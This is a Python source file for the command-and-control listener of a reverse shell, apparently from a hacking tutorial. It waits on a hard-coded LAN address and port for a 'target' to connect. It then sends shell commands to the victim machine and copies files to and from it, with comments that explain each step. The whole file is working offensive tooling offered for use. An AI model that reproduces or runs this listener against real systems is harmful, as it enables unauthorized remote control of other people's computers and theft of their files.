import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    # In python3 to send data over sockets we need to encode the data
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            # recv takes number of bytes to receive
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    # wb = write bytes
    # Opening new file to write to it
    f = open(file_name, 'wb')
    # https://www.kite.com/python/answers/how-to-set-a-timeout-on-a-socket-receiving-data-in-python
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        # End of file
        except socket.timeout as e:
            break

        except:
            print('[-] Error! Try Again!')

    target.settimeout(None)
    f.close()

def target_communication():
    global path
    while True:
        command = input('* Shell~%s: ' % str(ip) + path + '> ')
        reliable_send(command)
        if command == 'quit':
            sock.close()
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            # The system function executes any command in the terminal
            os.system('clear')
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command == 'echo %CD%':
            path = get_current_path()
            print(path)
        else:
            result = reliable_recv()
            print(result)

def get_current_path():
    reliable_send('echo %CD%')
    return reliable_recv()

# initializing socket object
# AF_INET : over IPv4
# SOCK_STREAM : using TCP
# Listen socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# binding ip address and port
listener_ip = '192.168.0.110'
listener_port = 5555
sock.bind((listener_ip, listener_port))

# start listening for incoming connnections
print('[+] Listening for incoming connections...')
# listening for upto 5 different connections
sock.listen(5)

# Store socket object of target and their ip
# Socket
target, ip = sock.accept()
print('[+] Target connected from: ' + str(ip))
path = get_current_path()

target_communication()